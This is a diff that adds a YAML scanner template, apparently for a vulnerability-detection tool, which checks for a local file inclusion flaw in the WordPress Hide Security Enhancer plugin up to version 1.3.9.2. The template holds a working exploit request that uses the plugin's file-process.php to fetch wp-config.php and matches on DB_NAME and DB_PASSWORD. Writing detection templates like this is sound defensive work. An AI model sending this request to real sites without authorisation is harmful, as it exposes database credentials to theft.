@@ -1,0 +1,25 @@
+id: hide-security-enhancer-lfi
+name: WordPress Hide Security Enhancer 1.3.9.2 Local File Inclusion
+severity: high
+confidence: tentative
+description: WordPress Hide Security Enhancer version 1.3.9.2 or less is susceptible to a local file inclusion vulnerability
+  which could allow malicious visitors to download any file in the installation.
+reference: CWE-22
+tags:
+- wordpress
+- wp-plugin
+- lfi
+- wp
+- vuln
+requests:
+- method: GET
+  path: /wp-content/plugins/wp-hide-security-enhancer/router/file-process.php?action=style-clean&file_path=/wp-config.php
+  matchers:
+  - type: body
+    words:
+    - DB_NAME
+    - DB_PASSWORD
+  - type: status
+    status:
+    - 200
+  condition: and
